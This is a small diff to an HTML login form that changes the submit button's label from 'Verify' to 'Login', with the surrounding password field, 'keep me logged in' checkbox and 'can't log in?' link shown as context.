@@ -33,7 +33,7 @@
 					<input name="password" id="password" type="password"></input><br />
 					<input id="keep" style="margin: 10px 0 0 84px" type="checkbox"></input>
 					<label for="keep" style="font-size:12px;">keep me logged in</label><br />
-					<input type="submit" name="submit" value="Verify" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
+					<input type="submit" name="submit" value="Login" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
 					<p><a style="text-decoration:none; color:#3B5998; margin:0 0 0 80px;" href="">can't log in?</a></p>
 				</form>
 			</div>
